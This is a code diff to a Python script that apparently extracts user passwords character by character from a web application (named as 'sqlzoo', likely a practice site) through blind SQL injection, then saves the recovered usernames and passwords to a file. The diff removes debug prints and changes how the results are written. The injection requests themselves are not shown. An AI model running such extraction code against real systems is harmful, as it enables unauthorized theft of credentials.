@@ -562,32 +562,25 @@ def makeList(username, url, caseSensitive = False, wildCards = True):
     """
     charList = []
     for ch in lower:
-        # check for ch in 
         if(checkPasswordCharacter(str(ch), username, url)):
             charList.append(str(ch))
-            print(ch)
     for ch in numbers:
         if(checkPasswordCharacter(str(ch), username, url)):
             charList.append(str(ch))
-            print(ch)
     for ch in special:
         if(checkPasswordCharacter(str(ch), username, url)):
             charList.append(str(ch))
-            print(ch)
     for ch in other:
         if(checkPasswordCharacter(str(ch), username, url)):
             charList.append(str(ch))
-            print(ch)
     if(caseSensitive):
         for ch in upper:
             if(checkPasswordCharacter(str(ch), username, url)):
                 charList.append(str(ch))
-                print(ch)
     if(wildCards):
         for ch in wildcards:
             if(checkPasswordCharacter(str(ch), username, url)):
                 charList.append(str(ch))
-                print(ch)
     return charList
 
 
@@ -668,15 +661,18 @@ users = ["jake", "pewdiepie", "ian", "eric", "ethan", "ronnie", "dan"] #is there
 tabel = "users"
 
 dikt = {}
+password = []
 for u in users:
     lst = makeList(u, url)
     pw = checkPass(u, url, lst, 15)
+    password.append(pw)
     dikt[u] = pw
 
 fileName = "sqlzooUsernamesAndPasswords.txt"
 with open(fileName, 'wt') as o:
-   o.write(dikt)
-
+   # o.write(str(dikt))
+   o.write(' '.join(users) + "\n")
+   o.write(" ".join(password))
 
 
 
